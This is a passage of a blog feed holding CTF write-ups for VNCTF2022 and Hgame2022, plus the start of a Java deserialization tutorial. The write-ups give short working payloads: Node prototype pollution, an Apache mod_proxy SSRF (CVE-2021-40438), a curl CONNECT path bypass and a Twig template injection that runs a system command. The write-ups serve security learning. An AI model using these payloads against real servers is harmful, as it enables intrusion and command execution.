keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token boolean">_</span> <span class="token string">"embed"</span><span class="token string">"fmt"</span><span class="token string">"os"</span><span class="token string">"github.com/gin-contrib/sessions"</span><span class="token string">"github.com/gin-contrib/sessions/cookie"</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>port <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">)</span><span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>port <span class="token operator">=</span> <span class="token string">"8080"</span><span class="token punctuation">&#125;</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"woW_you-g0t_sourcE_co6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token function">println</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><p>nodejs原型链污染<br><a href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">CVE-2022-21824</a></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> vm2 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">vm2<span class="token punctuation">.</span>NodeVM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/eval"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> e <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"wrong?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">"module.exports="</span><span class="token operator">+</span>e<span class="token punctuation">)</span><span class="token operator">?.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"wrong?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">k</span> <span class="token operator">=></span> <span class="token keyword">delete</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/source"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> p <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>path <span class="token operator">||</span> <span class="token string">"/src/index.js"</span><span class="token punctuation">;</span>  p <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload:<code>console.table([&#123;x:1&#125;], [&quot;__proto__&quot;]);</code></p><p><a href="https://chowdera.com/2022/02/202202161841265824.html">MORE</a></p><h2 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h2><p>User类的<code>height</code>属性被<code>transient</code>修饰<br><a href="https://www.baeldung.com/java-transient-keyword">https://www.baeldung.com/java-transient-keyword</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202181825968.png"><br>也就是transient修饰的变量无法直接反序列化<br>需要在User类中重写<code>writeObject</code>方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token class-name">ObjectOutputStream</span> s<span class="token punctuation">)</span> <span class="token keyword">throws</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span><span class="token class-name">IOException</span><span class="token punctuation">&#123;</span> s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//强制序列化name</span> s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;InterestingPHP&quot;&gt;&lt;a href=&quot;#InterestingPHP&quot; class=&quot;headerlink&quot; title=&quot;InterestingPHP&quot;&gt;&lt;/a&gt;InterestingPHP&lt;/h2&gt;&lt;pre class=&quot;language-php&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="VNCTF2022" scheme="http://lll-nnn.github.io/categories/CTF/wp/VNCTF2022/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="VNCTF2022" scheme="http://lll-nnn.github.io/tags/VNCTF2022/"/>
    
  </entry>
  
  <entry>
    <title>Hgame2022</title>
    <link href="http://lll-nnn.github.io/2022/02/06/hgame2022/"/>
    <id>http://lll-nnn.github.io/2022/02/06/hgame2022/</id>
    <published>2022-02-06T07:25:02.000Z</published>
    <updated>2022-02-19T15:24:07.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h2><blockquote><p>Webpack 是一个开源的前端打包工具。Webpack 提供了前端开发缺乏的模块化开发方式，将各种静态资源视为模块，并从它生成优化过的代码。</p></blockquote><p><code>Webpack 在打包 js 文件的时候开启了 sourcemap，可以借助 chrome开发者工具还原出源码</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202061601807.png"></p><p>base64解码两次</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h2><p><code>cve-2021-40438</code>—apache SSRF</p><p><a href="https://www.wangan.com/p/7fygfy122c313bee">CVE-2021-40438-Apache httpd mod_proxy SSRF漏洞深入分析与复现</a></p><p>给了apache配置文件<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202061604540.png"></p><p>payload:<br><code>/proxy?unix:a&#123;5000&#125;|http://internal.host/flag</code></p><h2 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h2><p>登录：<code>adm1n 1080a</code></p><p>主要是encode和decode两个函数</p><p>传输数据格式为：<code>&#123;&quot;2&quot;:&quot;2&quot;&#125;</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$k</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'|'</span> <span class="token punctuation">.</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>&#123;&quot;a&quot;:&quot;1&quot;,&quot;b&quot;:&quot;1&quot;&#125;</code>—–&gt;encode后<code>a|s:1:&quot;1&quot;;b|s:1:&quot;1&quot;;</code>—–&gt;decode后</p><pre><code>array(2) &#123;[&quot;a&quot;]=&gt;string(1) &quot;1&quot;[&quot;b&quot;]=&gt;string(1) &quot;1&quot;&#125;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202061736398.png"></p><h2 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h2><p><code>main.go</code></p><pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"log"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">fileHandler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">FileServer</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> fileHandler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/there_may_be_a_flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">`No! You can't see the flag!`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8889"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>利用点：</p><ol><li>CONNECT方法不执行路径规范化</li><li>官方的http库在注册路由的时候没有指定请求类型，会将所有方法都注册</li></ol><p>payload：<code>curl -X CONNECT --path-as-is http://filesystem.hgame.homeboyc.cn//there_may_be_a_flag</code></p><p><code>-X</code>:请求方法<br><code>--path-as-is</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202192320228.png"></p><h2 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h2><p>考点：<code>twig模板注入</code><br>payload:<code>&#123;&#123;["tac /flag | base64"]|map("system")&#125;&#125;</code><br><a href="https://xz.aliyun.com/t/10056">Twig 模板注入从零到一</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;webpack-engine&quot;&gt;&lt;a href=&quot;#webpack-engine&quot; class=&quot;headerlink&quot; title=&quot;webpack-engine&quot;&gt;&lt;/a&gt;webpack-engine&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Webpack 是</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="hgame2022" scheme="http://lll-nnn.github.io/categories/CTF/wp/hgame2022/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="hgame2022" scheme="http://lll-nnn.github.io/tags/hgame2022/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://lll-nnn.github.io/2022/01/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://lll-nnn.github.io/2022/01/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-01-19T11:15:51.000Z</published>
    <updated>2022-04-17T15:34:16.057Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>一个类要想能够被序列化和反序列化，必须实现<code>Serializable</code>接口</p><p><code>java.io.ObjectOutputStream</code>代表对象输出流，它的<code>writeObject(Object obj)</code>方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。</p><p><code>java.io.ObjectInputStream</code>代表对象输入流，它的<code>readObject()</code>方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</p><p>示例：<br><code>User.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">serialize</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span><span class="token comment">/** * 序列化ID */</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1184442687843856690L</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> address<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> telphone<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token class-name">String</span> address<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>address<span class="token operator">=</span>address<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setTel</span><span class="token punctuation">(</span><span class="token class-name">String</span> telphone<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>telphone<span class="token operator">=</span>telphone<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>address<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getTel</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>telphone<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>TestSerialize.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">serialize</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">MessageFormat</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestSerialize</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ar<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span><span class="token class-name">SerializeTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">User</span> user<span class="token operator">=</span><span class="token class-name">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">MessageFormat</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"name=&#123;0&#125;,address=&#123;1&#125;,telphone=&#123;2&#125;"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span><span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span><span class="token function">getTel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//序列化</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">SerializeTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span><span class="token class-name">User</span> user<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"1_/\\/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>user<span class="token punctuation">.</span><span class="token function">setTel</span><span class="token punctuation">(</span><span class="token string">"12138"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>user<span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token string">"芜湖市"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">FileOutputStream</span> fo<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectOutputStream</span> oo<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fo<span class="token punctuation">)</span><span class="token punctuation">;</span>oo<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Serialize success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>oo<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fo<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//反序列化</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">User</span> <span class="token class-name">Deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span><span class="token class-name">FileInputStream</span> fi<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectInputStream</span> ois<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">User</span> user<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deserialize seccess!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fi<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> user<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>运行<code>TestSerialize.java</code>，输出：</p><pre><code>Serialize success!Deserialize seccess!name=1_/\/,address=芜湖市,telphone=12138</code></pre><p>得到的文件<code>test.txt</code><br><img 